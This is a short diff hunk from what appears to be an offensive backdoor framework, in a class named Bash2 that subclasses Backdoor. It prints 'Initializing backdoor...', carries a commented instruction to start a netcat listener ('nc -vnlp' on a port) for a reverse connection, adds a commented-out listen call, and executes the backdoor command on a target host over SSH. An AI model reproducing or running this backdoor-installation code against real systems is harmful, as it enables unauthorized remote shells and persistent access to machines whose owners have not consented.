@@ -25,6 +25,7 @@ class Bash2(Backdoor):
         print(GOOD + "Initializing backdoor...")
         #input("Run the following command: nc -vnlp %s in another shell to start the listener." % port)
         
+        #self.listen()
 
         target.ssh.exec_command(self.get_command())
 
